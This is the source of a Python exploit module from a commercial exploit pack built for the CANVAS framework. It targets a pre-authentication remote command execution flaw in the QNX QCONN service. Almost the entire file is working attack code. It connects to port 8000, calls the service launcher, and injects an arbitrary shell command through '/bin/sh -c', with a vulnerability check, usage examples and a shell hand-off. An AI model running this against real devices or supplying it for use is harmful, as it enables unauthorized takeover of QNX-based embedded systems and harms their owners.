
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


NAME = "QNX QCONN Service Launcher Remote Code Execution"
DESCRIPTION = "Exploits a pre auth remote command execution vulnerability in QNX QCONN"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='QNX'
DOCUMENTATION["Date public"] = "2012/09/25"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/21520/"
DOCUMENTATION["Notes"] = """
All commands are executed through /bin/sh -c
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["ppc", "mips", "_arm"] ]
PROPERTY['VERSION'] = [ "All"]

NOTES="""
All commands are executed through /bin/sh -c

-------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> QNX QCONN Service Launcher Remote Command Execution
-------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: QNX

Payloads:
0: Execute Command

Example:
./3rdparty/White_Phosphorus/exploits/wp_qnx_qconn/wp_qnx_qconn.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O command:id
"""

PORT = 8000

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["QNX", (0x0000), []]
}

class theexploit(wp_exploit):
    PAYLOADS=["Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return wp_bannerchecktest(self,self.host,self.port,{"QCONN": 1},1000,"\n")

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return

    def getArgs(self):
        # Command line options
        if not getattr(self, 'RunFromGUI',False):
            if self.argsDict.has_key("payload"):
                p =int(self.argsDict["payload"])
                self.argsDict["payloadType"] = self.PAYLOADS[p]
            else:
                self.argsDict["payloadType"] = self.PAYLOADS[self.DEFAULT_PAYLOAD]
        
        if self.argsDict.has_key("command"):
            p = self.argsDict["command"]
            self.argsDict["payloadExecCmd"] = p
        
        if self.argsDict.get('payloadType','') == 'Execute Command':
            self.shell_EXECCMD = True
            self.execCMD = self.argsDict.get('payloadExecCmd')
        else:
            self.shell_EXECCMD = False
            self.execCMD = False
        
        self.shell_TCPCONNECTBACK = True # to cause the ip:port to be populated

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        payload = "start/flags 8000 /bin/sh /bin/sh -c \"" + self.execCMD +"\" -b\n"
        return payload

    def run(self):
        self.getArgs()
        
        payload = self.makesploit()        
        self.result_error = 0
        ret = 0
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            data = s.recv(128)
            s.send("service launcher\n")
            data = s.recv(128)
            self.log("WP> Sending Exploit")
            s.send(payload)
            data = s.recv(128)
            s.send("continue\n")
            data = s.recv(128)
            data = s.recv(128)
            if 'OK' in data:
                ret = 1
                data = s.recv(5000)
                if self.execCMD.count(';') > 0:
                    j = self.execCMD.count(';')
                    for i in range(0,j):
                        data += s.recv(4096)
                self.log("WP> Response:\n%s"%data)
            
            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        time.sleep(3)
        
        if self.result_error==0:
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
